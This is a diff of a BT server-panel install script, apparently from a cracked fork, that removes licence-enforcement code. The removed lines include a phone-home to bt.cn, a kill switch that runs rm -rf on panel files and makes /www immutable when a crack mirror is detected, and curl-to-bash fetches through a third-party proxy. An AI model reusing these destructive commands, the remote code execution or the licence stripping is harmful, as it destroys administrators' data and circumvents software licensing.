@@ -81,44 +81,11 @@ GetPackManager(){
 }
 
 bt_check(){
-	p_path=/www/server/panel/class/panelPlugin.py
-	if [ -f $p_path ];then
-		is_ext=$(cat $p_path|grep btwaf)
-		if [ "$is_ext" != "" ];then
-			send_check
-		fi
-	fi
-	
-	p_path=/www/server/panel/BTPanel/templates/default/index.html
-	if [ -f $p_path ];then
-		is_ext=$(cat $p_path|grep fbi)
-		if [ "$is_ext" != "" ];then
-			send_check
-		fi
-	fi
 }
 
 send_check(){
-	chattr -i /etc/init.d/bt
-	chmod +x /etc/init.d/bt
-	p_path2=/www/server/panel/class/common.py
-	p_version=$(cat $p_path2|grep "version = "|awk '{print $3}'|tr -cd [0-9.])
-	curl -sS --connect-timeout 3 -m 60 http://www.bt.cn/api/panel/notpro?version=$p_version
-	NODE_URL=""
-	exit 0;
 }
 init_check(){
-	CRACK_URL=(oss.yuewux.com);
-	for url in ${CRACK_URL[@]};
-	do
-		CRACK_INIT=$(cat /etc/init.d/bt |grep ${url})
-		if [ "${CRACK_INIT}" ];then
-			rm -rf /www/server/panel/class/*
-			chattr +i /www/server/panel/class
-			chattr -R +i /www/server/panel
-			chattr +i /www 
-		fi
-	done
 }
 GetSysInfo(){
 	if [ "${PM}" = "yum" ]; then
@@ -144,17 +111,6 @@ else
 	cpuCore="1"
 fi
 GetPackManager
-
-if [ -d "/www/server/phpmyadmin/pma" ];then
-	rm -rf /www/server/phpmyadmin/pma
-	EN_CHECK=$(cat /www/server/panel/config/config.json |grep English)
-	if [ "${EN_CHECK}" ];then
-		curl https://gh.112230.xyz/https://raw.githubusercontent.com/vtumi/btpanel-v7.7.0/proxy/install/update6_en.sh|bash
-	else
-		curl https://gh.112230.xyz/https://raw.githubusercontent.com/vtumi/btpanel-v7.7.0/proxy/install/update6.sh|bash
-	fi
-	echo > /www/server/panel/data/restart.pl
-fi
 
 if [ ! $NODE_URL ];then
 	EN_CHECK=$(cat /www/server/panel/config/config.json |grep English)
